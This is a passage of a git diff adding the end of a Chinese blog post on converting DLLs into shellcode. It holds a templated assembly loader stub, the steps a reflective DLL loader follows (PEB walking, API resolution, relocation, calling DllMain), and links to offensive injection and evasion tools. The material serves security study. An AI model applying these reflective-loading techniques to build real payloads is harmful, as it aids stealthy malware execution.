+add edx,&lt;DLL偏移量&gt;+&lt;DLL大小&gt;
+push &lt;flags&gt;
+push 0
+push edx
+push &lt;functionHash&gt;
+push eax
+call &lt;DLL&gt;
+add esp,0x14
+leave
+ret
+.............
+&lt;LOADPE_ShellCode&gt;
+.............
+&lt;DLLBytest&gt;
+</code></pre><p>指定dll生成bin，丢golink生成exe<br><img src="https://z3.ax1x.com/2021/09/09/hLfKQU.png" alt=""></p>
+<p>入口点：<br><img src="https://z3.ax1x.com/2021/09/09/hLfYJx.png" alt=""></p>
+<p>dword_401C04是DLL bytes<br><img src="https://z3.ax1x.com/2021/09/09/hLfaQO.png" alt=""></p>
+<p>-&gt;从PEB里寻找ntdll.dll的LdrLoadDLL函数<br>-&gt;从PEB里寻找ntdll.dll的LdrGetProcAddress函数<br>-&gt;利用LdrLoadDLL加载Kernel32.dll<br>    -&gt;加载VirtuaLLoc函数<br>    -&gt;加载VirtualProtect函数<br>    -&gt;加载FlushInstructionCache函数<br>    -&gt;加载GetNativeSysteminfo函数<br>    -&gt;加载Sleep函数<br>    -&gt;加载RtlAddFunctionTable函数<br>    -&gt;加载LoadlibraryA函数<br>-&gt;判断对应的DLL函数是否加载成功<br>-&gt;DLL各个区段赋值变量<br>-&gt;调用GetNativeSystemInfo函数<br>-&gt;Virtualloc修改内存可读可写<br>-&gt;复制PE文件头和各个节<br>-&gt;处理DLL的引入表<br>-&gt;对DLL进行重定位<br>-&gt;调用FlushInstructionCache刷新内存<br>-&gt;加载DLLMain函数<br><img src="https://z3.ax1x.com/2021/09/09/hLfrTA.png" alt=""><br><img src="https://z3.ax1x.com/2021/09/09/hLf6Yt.png" alt=""><br><img src="https://z3.ax1x.com/2021/09/09/hLf2Sf.png" alt=""><br><img src="https://z3.ax1x.com/2021/09/09/hLf4mQ.png" alt=""><br><img src="https://z3.ax1x.com/2021/09/09/hLfITs.png" alt=""><br><img src="https://z3.ax1x.com/2021/09/09/hLfHf0.png" alt=""></p>
+<p>最后的启动顺序<br>（图片来源WBG）<br><img src="https://z3.ax1x.com/2021/09/09/hLfLlT.png" alt=""></p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p>参考链接：<br><a href="https://wbglil.github.io/2020/03/27/%E5%85%B3%E4%BA%8E%E5%8F%8D%E5%B0%84dll%E4%BF%AE%E8%A1%A5/" target="_blank" rel="noopener">https://wbglil.github.io/2020/03/27/%E5%85%B3%E4%BA%8E%E5%8F%8D%E5%B0%84dll%E4%BF%AE%E8%A1%A5/</a><br><a href="https://www.ired.team/offensive-security/code-injection-process-injection/reflective-shellcode-dll-injection" target="_blank" rel="noopener">https://www.ired.team/offensive-security/code-injection-process-injection/reflective-shellcode-dll-injection</a><br><a href="https://idiotc4t.com/defense-evasion/reflectivedllinjection-variation" target="_blank" rel="noopener">https://idiotc4t.com/defense-evasion/reflectivedllinjection-variation</a><br><a href="https://www.cnblogs.com/h2zZhou/p/7721797.html" target="_blank" rel="noopener">https://www.cnblogs.com/h2zZhou/p/7721797.html</a></p>
+<p>现成工具:<br><a href="https://github.com/monoxgas/sRDI/blob/7889036a75e3aca65a2c01ee8f5549ed779a4c1f/PowerShell/ConvertTo-Shellcode.ps1" target="_blank" rel="noopener">https://github.com/monoxgas/sRDI/blob/7889036a75e3aca65a2c01ee8f5549ed779a4c1f/PowerShell/ConvertTo-Shellcode.ps1</a><br><a href="https://github.com/stephenfewer/ReflectiveDLLInjection" target="_blank" rel="noopener">https://github.com/stephenfewer/ReflectiveDLLInjection</a> - 划重点</p>
+<p>WBG的项目:<br><a href="https://github.com/WBGlIl/ReflectiveDLL_Patch/blob/master/ReflectiveDLL_Patch.py" target="_blank" rel="noopener">https://github.com/WBGlIl/ReflectiveDLL_Patch/blob/master/ReflectiveDLL_Patch.py</a><br><a href="https://github.com/WBGlIl/go-ReflectiveDLL" target="_blank" rel="noopener">https://github.com/WBGlIl/go-ReflectiveDLL</a></p>
+<p>看雪的项目:<a href="https://github.com/killeven/DllToShellCode/tree/master/DllToShellCode" target="_blank" rel="noopener">https://github.com/killeven/DllToShellCode/tree/master/DllToShellCode</a></p>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。 </span>
@@ -1991,12 +2000,12 @@ Ptr]))).Invoke([IntPtr]::Zero,0,$szw41,[IntPtr]::Zero,0,[IntPtr]::Zero)
 
 
 <div class="article_copyright">
-    <p><span class="copy-title">文章标题:</span>DerbyCon工具使用</p>
+    <p><span class="copy-title">文章标题:</span>DLL转shellcode研究</p>
     
     <p><span class="copy-title">本文作者:</span><a href="javascript:void(0)" title="九世">九世</a></p>
-    <p><span class="copy-title">发布时间:</span>2020-11-11, 16:45:36</p>
-    <p><span class="copy-title">最后更新:</span>2020-11-11, 17:24:03</p>
-    <span class="copy-title">原始链接:</span><a class="post-url" href="/posts/9b2537f1.html" title="DerbyCon工具使用">http://422926799.github.io/posts/9b2537f1.html</a>
+    <p><span class="copy-title">发布时间:</span>2021-09-09, 17:18:53</p>
+    <p><span class="copy-title">最后更新:</span>2021-09-09, 17:41:23</p>
+    <span class="copy-title">原始链接:</span><a class="post-url" href="/posts/8f26af05.html" title="DLL转shellcode研究">http://422926799.github.io/posts/8f26af05.html</a>
     <p>
         <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target="_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
     </p>
